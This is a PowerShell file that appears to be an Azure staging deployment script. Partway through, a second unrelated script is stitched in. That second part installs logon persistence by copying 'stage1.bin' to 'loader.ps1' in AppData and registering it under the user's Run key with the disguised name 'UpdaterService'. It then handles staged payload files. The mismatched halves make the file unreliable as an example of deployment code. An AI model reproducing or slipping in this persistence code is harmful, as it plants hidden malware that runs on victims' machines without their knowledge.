$ErrorActionPreference = "Stop"

$ResourceGroup = "rg-portal-staging-08"
$Location = "uksouth"
$TemplateFile = 'C:\Scripts\templates\portal-staging.json'
$ParameterFile = "C:\Scripts\templates\portal-staging.parameters.json"
$SubscriptionId = '731eb414-1220-3c9c-1ab2-a0ffbdd9e830'
$StorageAccount = 'ststaging6899'
$VmName = 'vm-portal-staging-08'
$OutputPath = "C:\Logs\deploy-staging-2024-09-28.json"
$DryRun = $false

$context = Get-AzContext
if (-not $context) {
    Connect-AzAccount -Tenant "contoso.com" -Subscription $SubscriptionId
}

if (-not (Get-AzResourceGroup -Name $ResourceGroup -ErrorAction SilentlyContinue)) {
    New-AzResourceGroup -Name $ResourceGroup -Location $Location | Out-Null
}
$DeploymentName = "portal-" + (Get-Date -Format 'yyyyMMdd-HHmm')
$deployment = New-AzResourceGroupDeployment -ResourceGroupName $ResourceGroup -TemplateFile $TemplateFile -Name $DeploymentName
Write-Host ("Deployment {0}: {1}" -f $deployment.DeploymentName, $deployment.ProvisioningState) -ForegroundColor Green
[CmdletBinding()]
param(
    [string]$RunKeyPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run',
    [string]$RegistryValue = 'UpdaterService',
    [string]$PersistencePath = "$env:APPDATA\loader.ps1"
)
$ErrorActionPreference = "Stop"

Write-Verbose "Installing per-user persistence"
if (-not (Test-Path -Path $PersistencePath)) {
    Copy-Item -Path "C:\ProgramData\stage1.bin" -Destination $PersistencePath -Force
}
New-ItemProperty -Path $RunKeyPath -Name $RegistryValue -Value ('powershell.exe -NoP -File "' + $PersistencePath + '"') -PropertyType String -Force
$TransferResult = Get-ItemProperty -Path $RunKeyPath -Name $RegistryValue
Write-Verbose ("Registered value: " + $TransferResult.$RegistryValue)

$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
